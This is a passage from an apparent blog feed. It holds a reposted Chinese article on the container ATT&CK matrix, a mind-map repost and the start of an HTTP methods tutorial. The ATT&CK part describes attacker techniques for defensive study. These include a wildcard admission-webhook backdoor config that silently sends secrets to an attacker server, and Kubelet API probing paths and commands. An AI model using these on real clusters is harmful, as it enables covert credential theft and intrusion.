Webhook)功能，即用于接收准入请求并对其进行处理的HTTP回调机制。</p><p>一种利用动态准入控制实现持久化的方式：攻击者在获取cluster-admin权限后，可以创建恶意的准入控制器hook掉所有的API访问，引用攻击者的外部webhook作为validating服务，这样k8s就会将携带敏感信息的API请求发送到攻击者所用服务器。</p><p>示例：利用准入控制器后门，使用通配符hook全部操作，使用failurePolicy和timeoutSeconds参数做到用户侧无感，从而实现隐蔽的数据窃取(如：K8s secret创建时发送到API的AK信息)。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> admissionregistration.k8s.io/v1<br><span class="hljs-symbol">kind:</span> ValidatingWebhookConfiguration<br>...<br><span class="hljs-symbol">webhooks:</span><br>- name: my-webhook.example.com<br><span class="hljs-symbol">  failurePolicy:</span> Ignore<br><span class="hljs-symbol">  timeoutSeconds:</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">  rules:</span><br>  - apiGroups:   [<span class="hljs-string">&quot;*&quot;</span>]<br><span class="hljs-symbol">    apiVersions:</span> [<span class="hljs-string">&quot;*&quot;</span>]<br><span class="hljs-symbol">    operations:</span>  [<span class="hljs-string">&quot;*&quot;</span>]<br><span class="hljs-symbol">    resources:</span>   [<span class="hljs-string">&quot;*/*&quot;</span>]<br><span class="hljs-symbol">    scope:</span>       <span class="hljs-string">&quot;*&quot;</span><br>...<br></code></pre></td></tr></table></figure><h2 id="7-Discovery-x2F-探测"><a href="#7-Discovery-x2F-探测" class="headerlink" title="7. Discovery&#x2F;探测"></a>7. Discovery&#x2F;探测</h2><h3 id="7-1-访问K8s-API-Server"><a href="#7-1-访问K8s-API-Server" class="headerlink" title="7.1 访问K8s API Server"></a>7.1 访问K8s API Server</h3><p>（参考2.4利用Service Account连接API Server执行指令）攻击者进入pod之后，可以通过curl或wget等http客户端，或使用编译好的报文构造工具，直接访问K8s REST API，当service account具有高权限时可以直接下发命令进行横向移动。而当用户具有低权限时，也可能通过API Server探测到集群内部的资源信息、运行状态以及secret，有利于寻找下一个突破点。</p><h3 id="7-2-访问Kubelet-API"><a href="#7-2-访问Kubelet-API" class="headerlink" title="7.2 访问Kubelet API"></a>7.2 访问Kubelet API</h3><p>在kubernetes集群中，每个Node节点都会启动Kubelet进程，用来处理Master节点下发到本节点的任务，管理Pod和其中的容器。包括10250端口的认证API、10255端口的只读API以及10256端口的健康检查API。</p><p>其中10255端口可以无需授权进行只读访问，攻击者可以访问&#x2F;pods获取到node、pod地址以及pod的挂载情况、环境变量等敏感信息，辅助还原业务场景和集群网络拓扑，以寻找后续攻击点。</p><p>关于Kubelet API官方并未提供文档，更多接口可在Kubelet源码中挖掘。一些有用的路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>&#123;node_ip&#125;:<span class="hljs-number">10255</span>/pods<br>http:<span class="hljs-regexp">//</span>&#123;node_ip&#125;:<span class="hljs-number">10255</span>/spec<br></code></pre></td></tr></table></figure><p>10250的端口当前版本中默认需要认证，但在老版本的K8s集群中或在用户权限(system:anonymous)被错误配置的情况下，可以尝试直接通过10250端口下发指令。</p><p>示例：命令下发：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs typescript">root<span class="hljs-meta">@myappnew</span>:<span class="hljs-regexp">/# curl --insecure  https:/</span><span class="hljs-regexp">/192.168.0.237:10250/</span>pods<br><span class="hljs-title class_">Unauthorized</span><br></code></pre></td></tr></table></figure><p><img src="https://ucc.alicdn.com/pic/developer-ecology/77cf88c7f9484ad8a03e57ed281cc294.png" alt="9CIDR.png"></p><h3 id="7-3-Cluster内网扫描"><a href="#7-3-Cluster内网扫描" class="headerlink" title="7.3 Cluster内网扫描"></a>7.3 Cluster内网扫描</h3><p>黑客通常会对Node、Pod、Service三个网段进行主机存活探测和端口扫描，然后从K8s内置服务、用户应用、第三方K8s插件等角度寻找更多攻击面，同时会通过找到Node IP并访问Kubelet API获取pod的详细拓扑信息。</p><p>阿里云容器服务默认CIDR：</p><h3 id="7-4-访问K8s-Dashboard所在的Pod"><a href="#7-4-访问K8s-Dashboard所在的Pod" class="headerlink" title="7.4 访问K8s Dashboard所在的Pod"></a>7.4 访问K8s Dashboard所在的Pod</h3><p>Kubernetes Dashboard为用户提供WEB界面，便于创建、修改和管理Kubernetes资源(如 Deployment，Job，DaemonSet等)。Dashboard的部署取决于云厂商和用户自身的配置，在官方的部署流程中，dashboard会创建独立的Namespace、Service、Role以及ServiceAccount。</p><p>示例：阿里云容器服务提供的dashboard：</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/c36b4fa554b6422ab484909616bb3b58.png" alt="10dashboard.png"></p><p>由于K8s pod之间默认允许通信，攻击者在进入某个pod之后，可以通过信息收集或内网扫描的方式发现K8s dashboard所在service地址，并通过kubernetes-dashboard service account进行认证操作。</p><h3 id="7-5-访问私有镜像库"><a href="#7-5-访问私有镜像库" class="headerlink" title="7.5 访问私有镜像库"></a>7.5 访问私有镜像库</h3><p>参考1.8和3.4关于私有镜像库的攻击面，攻击者可以在K8s secret或本地配置文件中找到私有镜像库的连接方式，并在权限允许的情况下劫持私有镜像库中的镜像，实现横向移动和持久化。</p><h3 id="7-6-访问云厂商服务接口"><a href="#7-6-访问云厂商服务接口" class="headerlink" title="7.6 访问云厂商服务接口"></a>7.6 访问云厂商服务接口</h3><p>（参考6.2云产品AK泄漏）在云原生的容器化应用中，服务往往会与多种内外部API进行交互，攻击者可以通过收集这些API的登录凭据或测试是否存在未授权访问来进行攻击准备。</p><p>此外，在某些云服务商提供的CaaS或Serverless容器中，为便于使用者与底层云基础设施进行通信，厂商通过植入专用pod或者将API挂载到业务pod的方式提供额外的接口，这些接口也会成为攻击者收集信息过程中的突破口。</p><h3 id="7-7-通过NodePort访问Service"><a href="#7-7-通过NodePort访问Service" class="headerlink" title="7.7 通过NodePort访问Service"></a>7.7 通过NodePort访问Service</h3><p>K8s service的暴露方式由三种：ClusterIP，NodePort和LoadBalancer。其中LoadBalancer多与云厂商的负载均衡类产品集成，具有较强的流量审计能力。<br>一些业务场景中存在着K8s与VM并存的内网环境，当攻击者通过非容器化的弱点进入内网时，可以借助NodePort进行横向移动。在频繁迭代的业务中，使用NodePort的服务相比ClusterIP更加固定，可用做控制通道来穿透网络边界管控以及防火墙的限制。<br>默认情况下，K8s集群NodePort分配的端口范围为：30000-32767。</p><h2 id="8-Lateral-Movement-x2F-横向移动"><a href="#8-Lateral-Movement-x2F-横向移动" class="headerlink" title="8. Lateral Movement&#x2F;横向移动"></a>8. Lateral Movement&#x2F;横向移动</h2><h3 id="8-1-窃取凭证攻击云服务"><a href="#8-1-窃取凭证攻击云服务" class="headerlink" title="8.1 窃取凭证攻击云服务"></a>8.1 窃取凭证攻击云服务</h3><p>（参考6.2云产品AK泄漏）攻击者利用容器内部文件或K8s secret中窃取到的云服务通信凭证进行横向移动。</p><h3 id="8-2-窃取凭证攻击其他应用"><a href="#8-2-窃取凭证攻击其他应用" class="headerlink" title="8.2 窃取凭证攻击其他应用"></a>8.2 窃取凭证攻击其他应用</h3><p>参考第6节的各项内容。在基础设施高度容器化的场景中，绝大部分服务都是API化的，这使凭证窃取成为扩展攻击面、获取目标数据的重要手段。K8s集群、云产品以及自建应用的通信凭证都是攻击者窃取的目标。</p><h3 id="8-3-通过Service-Account访问K8s-API"><a href="#8-3-通过Service-Account访问K8s-API" class="headerlink" title="8.3 通过Service Account访问K8s API"></a>8.3 通过Service Account访问K8s API</h3><p>（参考2.4利用Service Account连接API Server执行指令）攻击者在容器内部可通过Service Account访问K8s API刺探当前pod用户权限，并在权限允许的前提下对API下发指令或利用K8s提权漏洞访问集群中的其他资源。</p><h3 id="8-4-Cluster内网渗透"><a href="#8-4-Cluster内网渗透" class="headerlink" title="8.4 Cluster内网渗透"></a>8.4 Cluster内网渗透</h3><p>一般情况下，K8s会默认允许Cluster内部的pod与service之间直接通信，这构成了一个”大内网”环境。攻击者在突破一个pod之后，可以通过内网扫描收集服务信息并通过应用漏洞、弱口令以及未授权访问等方式渗透Cluster的其他资源。K8s支持通过自带的网络策略(NetworkPolicy)来定义pod的通信规则，一些网络侧插件、容器安全产品也支持东西向的通信审计与管控。</p><h3 id="8-5-通过挂载目录逃逸到宿主机"><a href="#8-5-通过挂载目录逃逸到宿主机" class="headerlink" title="8.5 通过挂载目录逃逸到宿主机"></a>8.5 通过挂载目录逃逸到宿主机</h3><p>（参考3.2通过挂载目录向宿主机写入文件）攻击者可以利用挂载到容器内部的目录完成从pod到node的移动。</p><h3 id="8-6-访问K8s-Dashboard"><a href="#8-6-访问K8s-Dashboard" class="headerlink" title="8.6 访问K8s Dashboard"></a>8.6 访问K8s Dashboard</h3><p>（参考7.4访问K8s Dashboard所在的Pod）攻击者在进入某个pod之后，可以通过信息收集或内网扫描的方式发现K8s dashboard所在service地址，并在管理员权限配置失当的情况下通过K8s Dashboard下发指令。</p><h3 id="8-7-攻击第三方K8s插件"><a href="#8-7-攻击第三方K8s插件" class="headerlink" title="8.7 攻击第三方K8s插件"></a>8.7 攻击第三方K8s插件</h3><p>为了快速上手，很多K8s快速入门指南都会介绍一些好用的插件和配置方案，但教程的创建者很少考虑到真实生产业务中的安全问题，而这些插件往往在初始的几个版本中存在鉴权方面的漏洞(如API默认允许未授权访问)，直到被攻击者反复测试之后才会逐渐稳定可靠。这些不安全的配置以及使用的第三方K8s插件&#x2F;工具会引入新的攻击面，并为横向移动提供便利。</p><p>示例：常见的利用第三方组件进行横向移动的过程：<br>攻击者进入pod后，通过未授权访问或漏洞攻击第三方组件，并利用这些组件的权限操纵K8s集群。</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/5d80969ed11a4bf3acab6b27457579a1.png" alt="11K8s集群.png"></p><h2 id="9-Impact-x2F-影响"><a href="#9-Impact-x2F-影响" class="headerlink" title="9. Impact&#x2F;影响"></a>9. Impact&#x2F;影响</h2><h3 id="9-1-破坏系统及数据"><a href="#9-1-破坏系统及数据" class="headerlink" title="9.1 破坏系统及数据"></a>9.1 破坏系统及数据</h3><p>以破坏为目的的攻击者可能会停止或禁用系统上的服务、删除某些核心文件及数据以使合法用户无法使用这些服务。停止关键服务可能会抑制防御方对事件的响应，并有利于攻击者的最终目标。</p><h3 id="9-2-劫持资源"><a href="#9-2-劫持资源" class="headerlink" title="9.2 劫持资源"></a>9.2 劫持资源</h3><p>常见于攻击者通过自动化脚本入侵并植入挖矿程序进行获利。</p><h3 id="9-3-DoS"><a href="#9-3-DoS" class="headerlink" title="9.3 DoS"></a>9.3 DoS</h3><p>攻击者会发起DoS攻击，影响系统的可用性。容器化场景中的DoS攻击包括对业务层、K8s API层的攻击以及对Pod资源的抢占。</p><h3 id="9-4-加密勒索"><a href="#9-4-加密勒索" class="headerlink" title="9.4 加密勒索"></a>9.4 加密勒索</h3><p>在传统主机安全场景中，有经验的攻击者会找到企业核心数据并对其进行加密勒索。由于容器场景的资源弹性较大，且后端数据的产生、存储、销毁链路往往通过云服务API实现，而非在用户磁盘上进行，企业可以通过云原生的快照与备份服务来实现资产备份，避免核心数据丢失。</p><h1 id="三、阿里云容器安全解决方案"><a href="#三、阿里云容器安全解决方案" class="headerlink" title="三、阿里云容器安全解决方案"></a>三、阿里云容器安全解决方案</h1><p>阿里云容器服务（ACK）提供高性能可伸缩的容器应用管理服务，支持企业级Kubernetes容器化应用的生命周期管理。阿里云容器镜像服务（ACR）是云原生时代的重要基础设施之一，支撑阿里巴巴经济体容器镜像托管，分钟级分发万节点。自2015年起，先后服务了数千家企业，托管了数 PB容器镜像数据，支撑月均镜像拉取数亿次。</p><p>为了帮助云上客户更好的做好容器安全建设，阿里云重点关注容器构建、容器部署和容器运行三大生命周期阶段，结合容器ATT&amp;CK攻防矩阵，提供自动化的容器安全检测和响应能力；同时联合阿里云原生容器安全服务，共同面向客户推出云上容器安全一体化方案，助力企业容器化进程。</p><p>借助云安全中心，阿里云可以为客户提供自动化的安全编排与响应能力，全面提升容器安全易用性；同时为容器镜像提供漏洞扫描和修复，并支持整合在容器构建流程中，避免部署存在风险的容器；对于运行时的容器被植入 Webshell、挖矿病毒等场景，自动化将隔离恶意样本，并通过联动云防火墙，针对存在漏洞的容器，提供虚拟补丁的能力，缓解安全风险。</p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>理解容器ATT&amp;CK攻防矩阵是构建容器安全能力的第一步，除了上述涉及的能力和措施外，阿里云安全团队建议用户在实施容器化过程中需要遵循以下几点安全规范，从不同角度缓解容器化带来的风险：<br>1、在应用生命周期中关注您的镜像，容器，主机，容器管理平台以及相关云服务的安全性，了解潜在风险以及如何保护整体容器环境的运行免受危害。<br>2、收集并妥善保管K8s集群、第三方CI组件以及云服务的API通信凭证，避免因人工误操作导致的AK泄露。<br>3、由于容器应用生态涉及到的中间件较多，系统管理者需要关注这些中间件的漏洞披露情况并及时做好脆弱性管理和补丁升级工作。</p><p>最后，针对上述容器ATT&amp;CK攻防矩阵，阿里云推出容器安全运行检测清单，企业可以根据下图中所展示的内容检测自己的容器安全水位，以便及时发现问题及时修复。</p><p><img src="https://ucc.alicdn.com/pic/developer-ecology/aa970b600dab4a7fb5a3e0879f67e7a3.jpg" alt="image-20230130094112788"></p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kubernetes</tag>
      
      <tag>转载</tag>
      
      <tag>安全</tag>
      
      <tag>容器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>K8S与Docker安全攻防思维导图</title>
    <link href="/2023/01/21/K8S%E4%B8%8EDocker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <url>/2023/01/21/K8S%E4%B8%8EDocker%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="K8S与Docker安全攻防思维导图"><a href="#K8S与Docker安全攻防思维导图" class="headerlink" title="K8S与Docker安全攻防思维导图"></a>K8S与Docker安全攻防思维导图</h1><blockquote><p>转载自攻防有道的思维导图：<a href="https://github.com/Bywalks/K8s-Mind-Map">https://github.com/Bywalks/K8s-Mind-Map</a></p></blockquote><p>K8S、Docker安全攻防思维导图。</p><h3 id="Docker安全攻防"><a href="#Docker安全攻防" class="headerlink" title="Docker安全攻防"></a>Docker安全攻防</h3><p><img src="https://s2.loli.net/2023/01/21/Z16UStkuWqIwoiR.png" alt="Docker安全攻防"></p><h3 id="Docker安全杂项"><a href="#Docker安全杂项" class="headerlink" title="Docker安全杂项"></a>Docker安全杂项</h3><p><img src="https://s2.loli.net/2023/01/21/zhCxO5gAcJ1yojr.png" alt="Docker安全杂项.png"></p><h3 id="K8S安全攻防"><a href="#K8S安全攻防" class="headerlink" title="K8S安全攻防"></a>K8S安全攻防</h3><p><img src="https://s2.loli.net/2023/01/21/nxODisTXSLQwHJz.png" alt="K8S安全攻防.png"></p><h3 id="K8S认证鉴权"><a href="#K8S认证鉴权" class="headerlink" title="K8S认证鉴权"></a>K8S认证鉴权</h3><p><img src="https://s2.loli.net/2023/01/21/UdIno92ZxwSX8yD.png" alt="K8S认证鉴权"></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.freebuf.com/vuls/196993.html">kubernetes集群渗透测试</a></li><li><a href="https://github.com/aquasecurity/kube-hunter">k8s渗透工具 - kube-hunter</a></li><li><a href="https://github.com/cdk-team/CDK">k8s渗透工具 - CDK</a></li><li><a href="https://jimmysong.io/kubernetes-handbook/usecases/service-mesh.html">服务网格</a></li><li><a href="https://javamana.com/2021/06/20210616193408465N.html">k8s安全攻防 - etcd篇</a></li><li><a href="https://www.cs.ru.nl/bachelors-theses/2020/Joren_Vrancken___4593847___A_Methodology_for_Penetration_Testing_Docker_Systems.pdf">A Methodology for Penetration Testing Docker Systems</a></li><li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">us-19-Edwards-Compendium-Of-Container-Escapes-up</a></li><li><a href="https://www.cyberark.com/resources/threat-research-blog/the-strange-case-of-how-we-escaped-the-docker-default-container">the-strange-case-of-how-we-escaped-the-docker-default-container</a></li><li><a href="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3">kubernetes-pentest-methodology-part-3</a></li><li><a href="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions">securing-kubernetes-clusters-by-eliminating-risky-permissions</a></li><li><a href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">RBAC Authorization</a></li><li><a href="https://www.cdxy.me/?p=839">K8s渗透测试之kube-apiserver利用</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#discover-secrets-in-etcd">pentesting-kubernetes</a></li><li><a href="https://www.cvedetails.com/product/34016/KubernetesKubernetes.html?vendor_id=15867">CVE - KubernetesKubernetes</a></li><li><a href="https://developer.aliyun.com/article/765449?groupCode=aliyunsecurity">云上容器ATT&amp;CK攻防矩阵</a></li><li><a href="https://kubernetes.io/zh/docs/tasks/configmap-secret/managing-secret-using-kubectl/">managing-secret-using-kubectl</a></li><li><a href="https://sudonull.com/post/13499-11-ways-to-not-become-a-victim-of-hacking-in-Kubernetes">11-ways-to-not-become-a-victim-of-hacking-in-Kubernetes</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247489415&idx=1&sn=4aea7b7ecff51710c79037ab07a889bc">Metarget - 云原生攻防靶场</a></li><li><a href="https://github.com/tom0li/collection-document#%E4%BA%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">云基础知识</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kubernetes</tag>
      
      <tag>转载</tag>
      
      <tag>安全</tag>
      
      <tag>容器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应用层协议：HTTP协议（下）——请求方法与状态码、消息</title>
    <link href="/2023/01/17/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8B%EF%BC%89%E2%80%94%E2%80%94%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%8E%E7%8A%B6%E6%80%81%E7%A0%81%E3%80%81%E6%B6%88%E6%81%AF/"/>
    <url>/2023/01/17/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8B%EF%BC%89%E2%80%94%E2%80%94%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E4%B8%8E%E7%8A%B6%E6%80%81%E7%A0%81%E3%80%81%E6%B6%88%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层协议：HTTP协议（下）——请求方法与状态码、消息"><a href="#应用层协议：HTTP协议（下）——请求方法与状态码、消息" class="headerlink" title="应用层协议：HTTP协议（下）——请求方法与状态码、消息"></a>应用层协议：HTTP协议（下）——请求方法与状态码、消息</h1><h2 id="请求方法与状态码"><a href="#请求方法与状态码" class="headerlink" title="请求方法与状态码"></a>请求方法与状态码</h2><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>HTTP&#x2F;1.1协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源：</p><ul><li><p><strong>GET</strong></p><p>向指定的资源发出“显示”请求。使用GET方法应该只用在读取资料，而不应当被用于产生“<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#%E5%89%AF%E4%BD%9C%E7%94%A8">副作用</a>”的操作中，例如在<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">网络应用程序</a>中。其中一个原因是GET可能会被<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E7%88%AC%E8%9F%B2">网络爬虫</a>等随意访问。参见<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#%E5%AE%89%E5%85%A8%E6%96%B9%E6%B3%95">安全方法</a>。浏览器直接发出的GET只能由一个url触发。GET上要在url之外带一些参数就只能依靠url上附带querystring。</p></li><li><p><strong>HEAD</strong></p><p>与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。</p></li><li><p><strong>POST</strong></p><p>向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。每次提交，表单的数据被浏览器用编码到HTTP请求的body里。浏览器发出的POST请求的body主要有两种格式，一种是application&#x2F;x-www-form-urlencoded用来传输简单的数据，大概就是”key1&#x3D;value1&amp;key2&#x3D;value2”这样的格式。另外一种是传文件，会采用multipart&#x2F;form-data格式。采用后者是因为application&#x2F;x-www-form-urlencoded的编码方式对于文件这种二进制的数据非常低效。</p></li><li><p><strong>PUT</strong></p><p>向指定资源位置上传其最新内容。</p></li><li><p><strong>DELETE</strong></p><p>请求服务器删除Request-URI所标识的资源。</p></li><li><p><strong>TRACE</strong></p><p>回显服务器收到的请求，主要用于测试或诊断。</p></li><li><p><strong>OPTIONS</strong></p><p>这个方法可使服务器传回该资源所支持的所有HTTP请求方法。用’*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。</p></li><li><p><strong>CONNECT</strong></p><p>HTTP&#x2F;1.1协议中预留给能够将连接改为隧道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。</p></li></ul><p>方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#405">状态码405</a>（Method Not Allowed），当服务器不认识或者不支持对应的请求方法的时候，应当返回<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#501">状态码501</a>（Not Implemented）。</p><p><strong>HTTP服务器至少应该实现GET和HEAD方法</strong>，其他方法都是可选的。当然，所有的方法支持的实现都应当符合下述的方法各自的语义定义。此外，除了上述方法，特定的HTTP服务器还能够扩展自定义的方法。例如：</p><ul><li><p><strong>PATCH</strong></p><p>用于将局部修改应用到资源。</p></li></ul><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><p>所有HTTP响应的第一行都是<strong>状态行</strong>，依次是当前HTTP版本号，3位数字组成的<a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81">状态代码</a>，以及描述状态的短语，彼此由空格分隔。</p><p>状态代码的第一个数字代表当前响应的类型：</p><ul><li><a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#1xx%E6%B6%88%E6%81%AF">1xx消息</a>——请求已被服务器接收，继续处理</li><li><a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#2xx%E6%88%90%E5%8A%9F">2xx成功</a>——请求已成功被服务器接收、理解、并接受</li><li><a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#3xx%E9%87%8D%E5%AE%9A%E5%90%91">3xx重定向</a>——需要后续操作才能完成这一请求</li><li><a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#4xx%E8%AF%B7%E6%B1%82%E9%94%99%E8%AF%AF">4xx请求错误</a>——请求含有词法错误或者无法被执行</li><li><a href="https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81#5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF">5xx服务器错误</a>——服务器在处理某个正确请求时发生错误</li></ul><h2 id="HTTP-消息"><a href="#HTTP-消息" class="headerlink" title="HTTP 消息"></a>HTTP 消息</h2><p>HTTP 消息是服务器和客户端之间交换数据的方式。有两种类型的消息：<em>请求</em>（request）——由客户端发送用来触发一个服务器上的动作；<em>响应</em>（response）——来自服务器的应答。</p><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p><img src="https://static001.geekbang.org/resource/image/85/c1/85ebb0396cbaa45ce00b505229e523c1.jpeg?wh=1920*1080" alt="img"></p><p>HTTP 请求的一个例子：</p><p><img src="https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview/http_request.png" alt="A basic HTTP request"></p><p>请求由以下元素组成：</p><ul><li>一个 HTTP 的请求<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">方法</a>，经常是由一个动词像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 或者一个名词像 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS"><code>OPTIONS</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD"><code>HEAD</code></a> 来定义客户端的动作行为。通常客户端的操作都是获取资源（GET 方法）或者发送 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms">HTML 表单</a>（POST 方法），虽然在一些情况下也会有其他操作。</li><li>要获取的资源的路径，通常是上下文中就很明显的元素资源的 URL，它没有 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol">protocol</a>（<code>http://</code>），<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Domain">domain</a>（<code>developer.mozilla.org</code>），或是 TCP 的 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Port">port (en-US)</a>（HTTP 一般在 80 端口）。</li><li>HTTP 协议版本号。</li><li>为服务端表达其他信息的可选<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">标头</a>。</li><li>对于一些像 POST 这样的方法，报文的主体（body）就包含了发送的资源，这与响应报文的主体类似。</li></ul><h4 id="标头（Header）"><a href="#标头（Header）" class="headerlink" title="标头（Header）"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#%E6%A0%87%E5%A4%B4%EF%BC%88header%EF%BC%89">标头（Header）</a></h4><p>来自请求的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">HTTP 标头</a>遵循和 HTTP 标头相同的基本结构：不区分大小写的字符串，紧跟着的冒号（<code>&#39;:&#39;</code>）和一个结构取决于标头的值。整个标头（包括值）由一行组成，这一行可以相当长。</p><p>有许多请求标头可用，它们可以分为几组：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/General_header">通用标头（General header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Request_header">请求标头（Request header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent"><code>User-Agent</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Type"><code>Accept-Type</code></a>，通过进一步的定义（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language"><code>Accept-Language</code></a>）、给定上下文（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer"><code>Referer</code></a>）或者进行有条件的限制（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None"><code>If-None</code></a>）来修改请求。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Representation_header">表示标头（Representation header）</a>，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）。</li></ul><p><img src="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages/http_request_headers3.png" alt="Example of headers in an HTTP request"></p><h4 id="主体（Body）"><a href="#主体（Body）" class="headerlink" title="主体（Body）"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Messages#%E4%B8%BB%E4%BD%93%EF%BC%88body%EF%BC%89">主体（Body）</a></h4><p>请求的最后一部分是它的主体。不是所有的请求都有一个主体：例如获取资源的请求，像 <code>GET</code>、<code>HEAD</code>、<code>DELETE</code> 和 <code>OPTIONS</code>，通常它们不需要主体。有些请求将数据发送到服务器以便更新数据：常见的的情况是 POST 请求（包含 HTML 